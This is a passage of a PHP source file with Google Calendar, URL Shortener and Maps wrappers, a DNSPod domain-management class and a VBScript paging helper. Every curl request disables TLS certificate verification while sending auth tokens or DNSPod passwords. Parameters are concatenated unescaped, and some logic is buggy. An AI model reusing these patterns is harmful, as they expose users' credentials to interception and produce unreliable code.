                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                        $xmlstr = curl_exec($ch);
                                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                        curl_close($ch);	
                                }
                        }
                        if ($xmlstr != "" && $xmlstr <> "wait"){
                                unset($header);                 
                                break;
                        }       
                        else{
                                unset($header);
                        }                                       
                }               
        }
        $photoremove['code'] = $xmlcode;
        $photoremove['xmlstr'] = $xmlstr;
        //print_r($photoremove);
        return $photoremove;
}

function googlecalendarlist($authclientLogin,$page,$pagesize){
	$jsonarray = array();
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        }       
        else{
                	$ch = curl_init();
                        unset($header);
                	$header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                	$header[] = "GData-Version: 2";
               		$url = "https://www.google.com/calendar/feeds/default/allcalendars/full?alt=jsonc";
                	curl_setopt($ch, CURLOPT_URL, $url);
                	curl_setopt($ch, CURLOPT_HEADER, 0);
                	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                	curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                	$jsonstr = curl_exec($ch);
                        $jsoncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                	curl_close($ch); 

                        if($jsoncode == '302'){
                                        //echo $xmlstr;
                                        $gsessionid = substr($jsonstr,stripos($jsonstr, 'gsessionid=')+strlen('gsessionid='),strlen($jsonstr));
                                        $gsessionid = substr($gsessionid,0,stripos($gsessionid, '">here</A>'));
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url.'&gsessionid='.$gsessionid);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);                                                 
                                        $jsonstr = curl_exec($ch);
                                        $jsoncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        //print_r($jsonstr);                          
                       }                	           
        }
	$jsonarray = json_decode($jsonstr, true);
	$jsonstr = array();
	$jsonstr['totalitem'] = count($jsonarray['data']['items']);
	$jsonstr['pagesize'] = $pagesize;
	$jsonstr['authordisplayName'] = $jsonarray['data']['author']['displayName'];
	$jsonstr['authoremail'] = $jsonarray['data']['author']['email'];
	$jsonstr['authorfeed'] = $jsonarray['data']['feedLink'];
	
        if ($jsonstr['totalitem'] > floor($jsonstr['pagesize']))
                $strpagesize = $jsonstr['pagesize']; 
        else{ 
                $strpagesize = $jsonstr['totalitem'];
        }
        if (fmod($jsonstr['totalitem'], $strpagesize) == 0){
                $jsonstr['totalpage']=$jsonstr['totalitem']/$strpagesize;
        }       
        else{
                $jsonstr['totalpage']=ceil($jsonstr['totalitem']/$strpagesize);
        }
        if ($jsonstr['totalpage'] == $page)
                $endid = $jsonstr['totalitem']-1;
        elseif ($jsonstr['totalpage'] > $page)
                $endid = floor($strpagesize*($page)-1);
        elseif ($jsonstr['totalpage'] < $page){
                $endid = floor($strpagesize*($page-1)-1);
        }	
        
	for($i=($page-1)*$strpagesize;$i<=$endid;$i++){
			$jsonstr['items'][$i]['calendarkind']  = $jsonarray['data']['items'][$i]['kind'];	
			$jsonstr['items'][$i]['calendarid']  = $jsonarray['data']['items'][$i]['id'];	
			$jsonstr['items'][$i]['calendartitle']  = $jsonarray['data']['items'][$i]['title'];	
			$jsonstr['items'][$i]['calendarcanEdit']  = $jsonarray['data']['items'][$i]['canEdit'];	
			$jsonstr['items'][$i]['calendarauthordisplayName']  = $jsonarray['data']['items'][$i]['author']['displayName'];	
			$jsonstr['items'][$i]['calendarauthoremail']  = $jsonarray['data']['items'][$i]['author']['email'];	
			$jsonstr['items'][$i]['calendaraccessLevel']  = $jsonarray['data']['items'][$i]['accessLevel'];				
	}	
	return $jsonstr;
}

function googleurlshortenerlist($authclientLogin,$page,$pagesize){
	$jsonarray = array('nextPageToken'=>'','totalItems'=>'');
	for($i=1;$i<=$page;$i++){
        	if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                	$totalcount = '300';
                	$count = '30';
                	$jsonstr = '{ "totalItems": '.$totalcount.', "itemsPerPage": 30, "nextPageToken": "2010-09-29T06:59:22.584+00:00", "items": [';
                	for($i = 1;$i <= $count;$i++){
                        	if ($i < $count)
                                	$jsonstr = $jsonstr . '{"kind": "urlshortener#url","id": "http://goo.gl/fbsS","longUrl": "http://www.google.com/","status": "OK","created": "2009-12-13T07:22:55.000+00:00"}'.',';
                        	else
                                	$jsonstr = $jsonstr . '{"kind": "urlshortener#url","id": "http://goo.gl/fbsS","longUrl": "http://www.google.com/","status": "OK","created": "2009-12-13T07:22:55.000+00:00"}';  
                	}       
                	$jsonstr .= ']}';
        	}       
        	else{
                	$ch = curl_init();
                	$header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                	$header[] = "GData-Version: 2";
                	if ($jsonarray['nextPageToken'] == '' && $jsonarray['totalItems'] == ''){
                		$url = "https://www.googleapis.com/urlshortener/v1/url/history?key=".$this->APIkey;
                	}	
                	elseif ($jsonarray['nextPageToken'] != '' && $jsonarray['totalItems'] != ''){
                		$url = "https://www.googleapis.com/urlshortener/v1/url/history?key=".$this->APIkey."&nextPageToken=".encodeuri($jsonarray['nextPageToken']);
                	}	
                	curl_setopt($ch, CURLOPT_URL, $url);
                	curl_setopt($ch, CURLOPT_HEADER, 0);
                	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                	curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                	$jsonstr = curl_exec($ch);
                	curl_close($ch);
        	}
		$jsonarray = json_decode($jsonstr, true);
		//print_r($jsonarray);
		if ($jsonarray['nextPageToken'] == '' && $jsonarray['totalItems'] != ''){
			$jsonarray = json_decode($jsonstr, true);
      			break;
              	}	
		if ($i == '1'){
                	if (fmod($jsonarray['totalItems'], $jsonarray['itemsPerPage']) == 0){
                       		$totalpage=$jsonarray['totalItems']/$jsonarray['itemsPerPage'];
                	}       
                	else{
        	               	$totalpage=ceil($jsonarray['totalItems']/$jsonarray['itemsPerPage']);
	               	}       
			
			if ($page > $totalpage){
				$page = $totalpage;
			}
		}
	}
	$jsonstr = array();
	if ($jsonarray['totalItems'] != '' && $jsonarray['itemsPerPage'] != ''){
		$jsonstr['totalitem'] = $jsonarray['totalItems'];
		$jsonstr['pagesize'] = $jsonarray['itemsPerPage'];
		//$jsonstr['items'] = $jsonarray['items'];
		for($i=0;$i<=$jsonarray['itemsPerPage']-1;$i++){
			$jsonstr['items'][$i]['urlkind']  = $jsonarray['items'][$i]['kind'];	
			$jsonstr['items'][$i]['urlshortlink']  = $jsonarray['items'][$i]['id'];	
			$jsonstr['items'][$i]['urllink']  = $jsonarray['items'][$i]['longUrl'];	
			$jsonstr['items'][$i]['urlstatus']  = $jsonarray['items'][$i]['status'];	
			$jsonstr['items'][$i]['urlcreatedtime']  = $jsonarray['items'][$i]['created'];	
		}
	}
	elseif($jsonarray['error']['code'] != '' && $jsonarray['totalItems'] == '' && $jsonarray['itemsPerPage'] == ''){
		$jsonstr['errorinfo'] = $jsonarray['error']['message'];	
		$jsonstr['errorparamname'] = $jsonarray['error']['errors']['0']['location'];	
;	
	}
	//print_r($jsonstr);
	return $jsonstr;
}

function googleurlshortenercreate($authclientLogin,$urllink){
       	if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
               	$jsonstr = '{"kind": "urlshortener#url","id": "http://goo.gl/fbsS","longUrl": "http://www.google.com/"}';
		
       	}       
       	else{
               	$ch = curl_init();
		$url = "https://www.googleapis.com/urlshortener/v1/url?key=".$this->APIkey;
                $postdata = json_encode(array("longUrl"=>trim($urllink)));
               	$header[] = "Authorization: GoogleLogin auth=".$authclientLogin;
               	$header[] = "GData-Version: 2";
                $header[] = "Content-type: application/json; charset=utf-8";
                $header[] = "Content-length: ".strlen($postdata);
                //$header[] = "If-Match: *";
                //$header[] = $postdata;          
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
               	$jsonstr = curl_exec($ch);
               	curl_close($ch);
       	}
	$jsonarray = json_decode($jsonstr, true);
	//print_r($jsonarray);	
	$jsonstr = array();
	if($jsonarray['kind'] != '' && $jsonarray['id'] != '' && $jsonarray['longUrl'] != '' ){
		$jsonstr['urlkind']  = $jsonarray['kind'];	
		$jsonstr['urlshortlink']  = $jsonarray['id'];	
		$jsonstr['urllink']  = $jsonarray['longUrl'];	
	}
	elseif($jsonarray['error']['code'] != '' && $jsonarray['error']['message'] != '' && $jsonarray['kind'] == '' && $jsonarray['id'] == '' && $jsonarray['longUrl'] == '' ){
		$jsonstr['errorinfo'] = $jsonarray['error']['message'];	
		$jsonstr['errorparamname'] = $jsonarray['error']['errors']['0']['location'];	
	}
	//print_r($jsonstr);
	return $jsonstr;
}

function googleurlshortenerexpand($authclientLogin,$urllink){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
               	$jsonstr = '{"kind": "urlshortener#url","id": "http://goo.gl/fbsS","longUrl": "http://www.google.com/","status": "OK"}';
        }       
        else{
               	$ch = curl_init();
               	$header[] = "Authorization: GoogleLogin auth=".$authclientLogin;
               	$header[] = "GData-Version: 2";
       		$url = "https://www.googleapis.com/urlshortener/v1/url?shortUrl=".trim($urllink)."?key=".$this->APIkey;
               	curl_setopt($ch, CURLOPT_URL, $url);
               	curl_setopt($ch, CURLOPT_HEADER, 0);
               	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
               	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
               	curl_setopt($ch, CURLOPT_TIMEOUT, 150);
               	$jsonstr = curl_exec($ch);
               	curl_close($ch);
        }
        //print_r($jsonstr);
	$jsonarray = json_decode($jsonstr, true);
        //print_r($jsonarray);
	$jsonstr = array();
	//echo $jsonarray['id'];
	//echo $urllink;
	if ($jsonarray['id'] != '' && $jsonarray['id'] == $urllink){
		//echo 'll';
		//print_r($jsonarray);
		$jsonstr['urlkind']  = $jsonarray['kind'];	
		$jsonstr['urlshortlink']  = $jsonarray['id'];	
		$jsonstr['urllink']  = $jsonarray['longUrl'];	
		$jsonstr['urlstatus']  = $jsonarray['status'];	
	}
	elseif($jsonarray['error']['code'] != ''){
		$jsonstr['errorinfo'] = $jsonarray['error']['message'];	
		$jsonstr['errorparamname'] = $jsonarray['error']['errors']['0']['location'];	
;	
	}
	//print_r($jsonstr);
	return $jsonstr;
}

function googleeneranalytics($authclientLogin,$urllink){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
               	$jsonstr = '{"kind": "urlshortener#url","id": "http://goo.gl/fbsS","longUrl": "http://www.google.com/","status": "OK","created": "2009-12-13T07:22:55.000+00:00","analytics": {"allTime": {"shortUrlClicks": "3227","longUrlClicks": "9358","referrers": [ { "count": "2160", "id": "Unknown/empty" }  ],"countries": [ { "count": "1022", "id": "US" }  ],"browsers": [ { "count": "1025", "id": "Firefox" }  ],"platforms": [ { "count": "2278", "id": "Windows" }  ]},"month": {  },"week": {  },"day": {  },"twoHours": {  }}}';
        }       
        else{
               	$ch = curl_init();
               	$header[] = "Authorization: GoogleLogin auth=".$authclientLogin;
               	$header[] = "GData-Version: 2";
       		$url = 'https://www.googleapis.com/urlshortener/v1/url?projection=FULL&shortUrl='.trim($urllink)."&key=".$this->APIkey;
               	curl_setopt($ch, CURLOPT_URL, $url);
               	curl_setopt($ch, CURLOPT_HEADER, 0);
               	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
               	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
               	curl_setopt($ch, CURLOPT_TIMEOUT, 150);
               	$jsonstr = curl_exec($ch);
               	curl_close($ch);
        }
        //echo($jsonstr);
	$jsonarray = json_decode($jsonstr, true);
        //print_r($jsonarray);
	$jsonstr = array();
	if ($jsonarray['id'] != '' && $jsonarray['id'] == $urllink){
		$jsonstr['urlkind']  = $jsonarray['kind'];	
		$jsonstr['urlshortlink']  = $jsonarray['id'];	
		$jsonstr['urllink']  = $jsonarray['longUrl'];	
		$jsonstr['urlstatus']  = $jsonarray['status'];	
		$jsonstr['created']  = $jsonarray['created'];	
	}
	elseif($jsonarray['error']['code'] != ''){
		$jsonstr['errorinfo'] = $jsonarray['error']['message'];	
		$jsonstr['errorparamname'] = $jsonarray['error']['errors']['0']['location'];	
;	
	}
	//print_r($jsonstr);
	return $jsonstr;
}

function googleMap(){
?>
<link href="http://code.google.com/apis/maps/documentation/javascript/examples/standard.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script><script type="text/javascript">
  var geocoder;
  var map;
  var directionDisplay;
  var directionsService = new google.maps.DirectionsService();  

  function initialize() {
    codeAddress();
  }

  function codeAddress() {
    if (document.getElementById("address").value != "")
        var address = document.getElementById("address").value;
    else
        var address = '<?php echo iconv("gb2312","utf-8","重庆西永")?>';
    geocoder = new google.maps.Geocoder();
    directionsDisplay = new google.maps.DirectionsRenderer();    
    geocoder.geocode({'address': address}, function(results, status) {
      if (status == google.maps.GeocoderStatus.OK) {
        //map.setCenter(results[0].geometry.location, 13);
        //var marker = new google.maps.Marker({
        //    map: map, 
        //    position: results[0].geometry.location
        //});
                var latlng = results[0].geometry.location;
                var myOptions = {
                zoom: 13,
                center: latlng,
                mapTypeId: google.maps.MapTypeId.ROADMAP
                }
                
                map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);
                directionsDisplay.setMap(map);

        var marker = new google.maps.Marker({
            map: map, 
            position: results[0].geometry.location
        });

      } else {
        alert("Geocode was not successful for the following reason: " + status);
      }
    });
  }

  function calcRoute() {
    var start = document.getElementById("start").value;
    var end = document.getElementById("end").value;
    var selectedMode = document.getElementById("mode").value;
    var request = {
        origin:start, 
        destination:end,
        travelMode: google.maps.DirectionsTravelMode[selectedMode]
    };
    directionsService.route(request, function(response, status) {
      if (status == google.maps.DirectionsStatus.OK) {
        directionsDisplay.setDirections(response);
      }else {
        alert("Geocode was not successful for the following reason: " + status);
      }
    });
  }

</script>
<?php 
}

function googleMapload(){
?>
<body onLoad="initialize()" onUnload="GUnload()">
<div id="map_canvas" style="width: 100%; height: 100%; float:left; border: 1px solid black;"></div>
<div id="pano" style="position:absolute; left:410px; top: 8px; width: 400px; height: 300px;"></div>
<?php 
}

}
?>

<?php 

class dnspod_class{
function dnspoddomainlist($dnspoduname,$dnspodpwd,$type,$page,$pagesize){
        //echo $page.$pagesize;
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $totalrecord = '35';
                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                '<dnspod>'.
                                '<status>'.
                                '<code>1</code>'.
                                '<message>Get domain list success</message>'.
                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                '</status>'.
                                '<info>'.
                                '<domain_total>'.$totalrecord.'</domain_total>'.
                                '</info>'.
                                '<domains>';
                if (ceil($totalrecord/$pagesize) > $page){
                        $strpagesize = $pagesize;
                }       
                elseif (ceil($totalrecord/$pagesize) == $page){
                        $strpagesize = fmod($totalrecord,$pagesize);
                }       
                for($i=1;$i<=$strpagesize;$i++){                        
                        $xmlstr = $xmlstr.
                                        '<item>'.
                                        '<id>141842</id>'.
                                        '<name>dnspoo.com</name>'.
                                        '<grade>D_Free</grade>'.
                                        '<status>enable</status>'.
                                        '<records>0</records>'.
                                        '<shared_from>dnspod@dnspod.com</shared_from>'.
                                        '</item>';              
                }
                $xmlstr = $xmlstr.
                                '</domains>'.
                                '</dnspod>';
        }       
        else{   
                $ch = curl_init();
                $url = "https://dnsapi.cn/Domain.List";
                $data = array(
                        'login_email' => $dnspoduname,
                        'login_password' => $dnspodpwd,
                        'format' => 'xml',
                        'type' => trim($type)==''?'mine':trim($type),
                        'offset' => $pagesize*($page-1),
                        'length' => $pagesize
                );
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }
       
        $type = trim($type)==''?'mine':trim($type);
        //echo trim(request('type'))==''?'mine':trim(request('type'));
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        // 加Xml 文件    
        $objXml->loadXML($xmlstr);
        //echo $xmlstr;
        //return;

        $domainlist['code'] = $objXml->getElementsByTagName("code")->item(0)->nodeValue;
        $domainlist['message'] = $objXml->getElementsByTagName("message")->item(0)->nodeValue;

        $objList = $objXml->getElementsByTagName("item");                       
        $domainlist['length'] = $objList->length;

        //echo $objList->length;

        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
        //echo $pagesize;
        $totalitem = $objXml->getElementsByTagName("domain_total")->item(0)->nodeValue;
        $domainlist['totalitem'] = $objXml->getElementsByTagName("domain_total")->item(0)->nodeValue;
        //echo $domainlist['totalitem'];
        //$totalitem = $objList->length;
        if (fmod($totalitem, $pagesize) == 0){
                $totalpage=$totalitem/$pagesize;
        }       
        else{
                $totalpage=ceil($totalitem/$pagesize);
        }       
        //echo $strpagesize;
        for($i = 0;$i <= $strpagesize-1;$i++){
                $objHdd = $objList->item($i);
                        $domainlist[$i]['domainid'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('id')->item(0)->nodeValue);
                        $domainlist[$i]['domain'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('name')->item(0)->nodeValue);
                        $domainlist[$i]['domaingrade'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('grade')->item(0)->nodeValue);
                        $domainlist[$i]['domainstatus'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('status')->item(0)->nodeValue);
                        $domainlist[$i]['domainrecords'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('records')->item(0)->nodeValue);
                        $domainlist[$i]['domainshared'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('shared_from')->item(0)->nodeValue);
        }
        //print_r($domainlist);
        return $domainlist;
}

function dnspoddomaincreate($dnspoduname,$dnspodpwd,$domain){
if (preg_match ("/([\w]*[\.])+[\w]+/i", trim($domain))){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                '<dnspod>'.
                                '<status>'.
                                '<code>1</code>'.
                                '<message>Domain name created success.</message>'.
                                '<created_at>2010-10-06 17:12:44</created_at>'.
                                '</status>'.
                                '<domain>'.
                                '<id>472146</id>'.
                                '<punycode>sexdiy.org</punycode>'.
                                '</domain>'.
                                '</dnspod>';
        }       
        else{   
                $ch = curl_init();
                $url = "https://dnsapi.cn/Domain.Create";
                $data = array(
                        'login_email' => $dnspoduname,
                        'login_password' => $dnspodpwd,
                        'domain' => trim($domain),
                        'format' => 'xml'
                );
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");                        
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr); 
        $dnspoddomaincreate['code'] = $objXml->getElementsByTagName("code")->item(0)->nodeValue;
        $dnspoddomaincreate['punycode'] = $objXml->getElementsByTagName("punycode")->item(0)->nodeValue;
        $dnspoddomaincreate['id'] = $objXml->getElementsByTagName("id")->item(0)->nodeValue;
        $dnspoddomaincreate['message'] = $objXml->getElementsByTagName("message")->item(0)->nodeValue;
}
return $dnspoddomaincreate;
}

function dnspoddomainremove($dnspoduname,$dnspodpwd,$domain_id,$type,$postfield,$page,$pagesize){
        if (trim($domain_id) != ""){
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                        '<dnspod>'.
                                        '<status>'.
                                        '<code>1</code>'.
                                        '<message>Domain delete success.</message>'.
                                        '<created_at>2008-11-26 16:12:00</created_at>'.
                                        '</status>'.
                                        '</dnspod>';
                }       
                else{   
                        $ch = curl_init();
                        $url = "https://dnsapi.cn/Domain.Remove";
                        $data = array(
                                'login_email' => $dnspoduname,
                                'login_password' => $dnspodpwd,
                                'domain_id' => trim($domain_id),
                                'format' => 'xml'
                        );
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                        curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                        $xmlstr = curl_exec($ch);
                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);                                
                        curl_close($ch);
                }
        }
        elseif (trim($domain_id) == "" && count($postfield) > 0){
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        $totalrecord = '220';
                        $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                        '<dnspod>'.
                                        '<status>'.
                                        '<code>1</code>'.
                                        '<message>Get domain list success</message>'.
                                        '<created_at>2008-11-26 16:12:00</created_at>'.
                                        '</status>'.
                                        '<info>'.
                                        '<domain_total>'.$totalrecord.'</domain_total>'.
                                        '</info>'.
                                        '<domains>';
                        if (ceil($totalrecord/$pagesize) > $page){
                                $strpagesize = $pagesize;
                        }       
                        elseif (ceil($totalrecord/$pagesize) == $page){
                                $strpagesize = fmod($totalrecord,$pagesize);
                        }       
                        for($i=1;$i<=$strpagesize;$i++){
                                $xmlstr = $xmlstr.
                                                '<item>'.
                                                '<id>141842</id>'.
                                                '<name>dnspoo.com</name>'.
                                                '<grade>D_Free</grade>'.
                                                '<status>enable</status>'.
                                                '<records>0</records>'.
                                                '<shared_from>dnspod@dnspod.com</shared_from>'.
                                                '</item>';              
                        }
                        $xmlstr = $xmlstr.
                                        '</domains>'.
                                        '</dnspod>';
                }       
                else{   
                        $ch = curl_init();
                        $url = "https://dnsapi.cn/Domain.List";
                        $data = array(
                                'login_email' => $dnspoduname,
                                'login_password' => $dnspodpwd,
                                'format' => 'xml',
                                'type' => trim($type)==''?'mine':trim($type),
                                'offset' => $pagesize*($page-1),
                                'length' => $pagesize                           
                        );
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                        $xmlstr = curl_exec($ch);
                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);                                
                        curl_close($ch);
                }
                $type = trim($type)==''?'mine':trim($type);
                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                // 加Xml 文件    
                $objXml->loadXML($xmlstr);      
        
                $objList = $objXml->getElementsByTagName("item");                       
                if ($objList->length == $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                $totalitem = $objXml->getElementsByTagName("domain_total")->item(0)->nodeValue;
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }

                //$xmlstr = "";
                $xmlstr = "wait";                       
                for($i = 0;$i <= $strpagesize-1;$i++){
                        $objHdd = $objList->item($i);
                        if ($postfield["chidd".$i] != ""){
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                        '<dnspod>'.
                                                        '<status>'.
                                                        '<code>1</code>'.
                                                        '<message>Domain delete success.</message>'.
                                                        '<created_at>2008-11-26 16:12:00</created_at>'.
                                                        '</status>'.
                                                        '</dnspod>';
                                }       
                                else{   
                                        $ch = curl_init();
                                        $url = "https://dnsapi.cn/Domain.Remove";
                                        $data = array(
                                                'login_email' => $dnspoduname,
                                                'login_password' => $dnspodpwd,
                                                'domain_id' => $objHdd->getElementsByTagName("id")->item(0)->nodeValue,
                                                'format' => 'xml'
                                        );
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                        $xmlstr = curl_exec($ch);
                                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);                                
                                        curl_close($ch);
                                }
                        }       
                        if ($xmlstr == "" || $xmlstr == "wait"){
                        }
                        else{
                                $objXml = new DOMDocument();  
                                $objXml->preserveWhiteSpace = true;
                                $objXml->async = false; 
                                $objXml->loadXML($xmlstr);                              
                                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == false || $objXml->getElementsByTagName("code")->item(0)->nodeValue != "1")
                                        break;
                        }       
                }                               
        }

        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);    
        $dnspoddomainremove['xmlcode'] = $xmlcode;
        $dnspoddomainremove['xmlstr'] = $xmlstr;                
        $dnspoddomainremove['code'] = $objXml->getElementsByTagName("code")->item(0)->nodeValue;
        $dnspoddomainremove['message'] = $objXml->getElementsByTagName("message")->item(0)->nodeValue;          
        return $dnspoddomainremove;
}

}
?>

<?php 
class PageChange{
function gotopage($totalpage,$url,$title,$note){
?>
<script language="vbscript">
<!--
function gotopage()
dim pagecount,inttotalpage
inttotalpage = <?php  echo $totalpage; ?>
<?php echo "\r\n";?>
pagecount=int(trim(inputbox("<?php  echo $note;?>","<?php  echo $title; ?>")))
if int(pagecount) > int(inttotalpage) then
        msgbox("<?php echo formatchar("输入页码大于实际页数！")?>")
else
